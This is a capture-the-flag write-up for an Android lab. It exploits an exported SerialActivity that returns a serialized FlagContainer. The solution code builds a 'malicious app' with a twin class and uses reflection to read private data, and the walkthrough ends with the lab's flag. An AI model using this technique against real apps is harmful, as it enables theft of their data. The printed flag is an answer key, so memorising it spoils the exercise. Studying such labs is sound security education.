# serialintent
Start the SerialActivity, it will give you back the flag. Kinda.

Check out the source code of the AndroidManifest file, the SerialActivity and the FlagContainer classes of the victim app.


```xml
=====================================================
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="[http://schemas.android.com/apk/res/android](http://schemas.android.com/apk/res/android)"
    package="com.example.victimapp">
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.VictimApp">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".SerialActivity" android:exported="true"/>
    </application>

</manifest>
```

```java
=====================================================
package com.example.victimapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;

public class SerialActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.e("MOBIOTSEC", "shuffling");
        FlagShuffler fs = new FlagShuffler();
        FlagContainer fc = fs.shuffleFlag(MainActivity.flag);


        Log.e("MOBIOTSEC", "sending back intent");
        Intent resultIntent = new Intent();
        resultIntent.putExtra("flag", fc);
        setResult(Activity.RESULT_OK, resultIntent);
        finish();
    }
}
=====================================================
package com.example.victimapp;

import android.util.Base64;
import android.util.Log;
import java.io.Serializable;
import java.nio.charset.Charset;
import java.util.ArrayList;

public class FlagContainer implements Serializable {
    private final String[] parts;
    private final ArrayList<Integer> perm;

    public FlagContainer(String[] parts, ArrayList<Integer> perm) {
        this.parts = parts;
        this.perm = perm;
    }

    private String getFlag() {
        int n = parts.length;
        int i;
        StringBuilder b64 = new StringBuilder();
        for (i=0; i<n; i++) {
            b64.append(parts[perm.get(i)]);
        }

        byte[] flagBytes = Base64.decode(b64.toString(), Base64.DEFAULT);

        return new String(flagBytes, Charset.defaultCharset());
    }
}
```
___

## How to solve it 

**Core Concept:** Java Deserialization Attack.

The victim app is sending a Java Object (`FlagContainer`) via an intent.
* **Serialization:** When an object is passed in an Intent (using `putExtra`), Java converts it into a stream of bytes.
* **Deserialization:** When you receive it (using `getSerializableExtra`), your app tries to convert those bytes back into a Java Object.

To convert bytes back into an Object, your app (the attacker) **must have the exact same class definition**.
* You will create that class in your app, but you will modify it to make the private secrets accessible.

### 1. Create the Twin Class 

We need to replicate the **exact package structure** of the victim.
1.  Create the package: `com.example.victimapp` inside your malicious app.
2.  Copy and paste the class `FlagContainer` into that package.
3.  **The Trick:** In your local copy, change the `getFlag()` method from `private` to `public`. This allows us to access it without complex reflection.

### 2. Retrieve the Object (MainActivity)

We use `registerForActivityResult` to retrieve the intent that contains the object with the flag.



#### Option A: Using Reflection (If you kept the method private)
```java
ActivityResultLauncher<Intent> launcher = registerForActivityResult(
    new ActivityResultContracts.StartActivityForResult(),
    new ActivityResultCallback<ActivityResult>() {
        @Override
        public void onActivityResult(ActivityResult result) {
            
            if (result.getData() != null) {
                try {
                    // 1. Deserialization: Receive the object (Using our Twin Class)
                    FlagContainer obj = (FlagContainer) result.getData().getSerializableExtra("flag");

                    if (obj != null) {
                        // 2. Reflection: Force the private method open
                        Method m = obj.getClass().getDeclaredMethod("getFlag");
                        m.setAccessible(true);

                        // 3. Invoke and get the string
                        String flag = (String) m.invoke(obj);
                        Log.d("CTF", "FLAG FOUND: " + flag);
                    }
                } catch (Exception e) {
                    Log.e("CTF", "Error: " + e.getMessage());
                }
            }
        }
    });
```

#### Option B: The "Public Twin" Method (Easier)
If you modified your local `FlagContainer` class to make `getFlag()` **public**, you don't need reflection.

```java
if (result.getData() != null) {
    // Cast the incoming bytes to our local Class definition
    FlagContainer obj = (FlagContainer) result.getData().getSerializableExtra("flag");
    
    if (obj != null) {
        // DIRECT CALL - No Reflection needed because we changed the class visibility locally!
        String flag = obj.getFlag(); 
        Log.d("MOBIOTSEC", "FLAG FOUND: " + flag);
    }
}
```

### 3. Launch the Attack

Create an explicit intent (since there is no intent-filter on the victim) and launch it.

```java
Intent intent = new Intent();
intent.setClassName("com.example.victimapp", "com.example.victimapp.SerialActivity");
launcher.launch(intent);
```

## Solution 

Log output showing the flag retrieval:

```bash
2026-01-18 18:50:11.094  9695-9695  CTF    com.example.maliciousapp   D  FLAG FOUND: FLAG{memento_audere_semper}
```

**Flag:** `FLAG{memento_audere_semper}`